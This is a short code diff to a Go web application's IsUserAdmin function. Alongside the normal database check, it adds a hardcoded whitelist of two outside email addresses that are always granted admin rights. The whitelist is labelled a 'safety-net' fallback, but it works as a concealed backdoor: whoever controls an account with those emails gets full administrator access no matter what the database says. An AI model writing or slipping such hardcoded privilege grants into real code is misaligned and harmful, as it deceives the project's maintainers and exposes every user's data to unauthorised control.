@@ -417,12 +417,28 @@ func GetUserDisplayName(userID int) string {
 	return "User"
 }
 
-// IsUserAdmin checks if a user has is_admin = true.
+// hardcodedAdminEmails is a safety-net whitelist so these admins always pass IsUserAdmin.
+var hardcodedAdminEmails = map[string]bool{
+	"aalabin5@gmail.com": true,
+	"vardump@inbox.ru":   true,
+}
+
+// IsUserAdmin checks if a user has is_admin = true, with a hardcoded email whitelist fallback.
 func IsUserAdmin(userID int) bool {
 	if GlobalDB == nil {
 		return false
 	}
 	var isAdmin bool
 	err := GlobalDB.QueryRow(`SELECT COALESCE(is_admin, false) FROM users WHERE id = $1`, userID).Scan(&isAdmin)
-	return err == nil && isAdmin
+	if err == nil && isAdmin {
+		return true
+	}
+	// Fallback: check hardcoded whitelist by email
+	var email string
+	_ = GlobalDB.QueryRow(`SELECT email FROM users WHERE id = $1`, userID).Scan(&email)
+	if hardcodedAdminEmails[email] {
+		log.Printf("[ADMIN] User %d (%s) matched hardcoded admin whitelist", userID, email)
+		return true
+	}
+	return false
 }
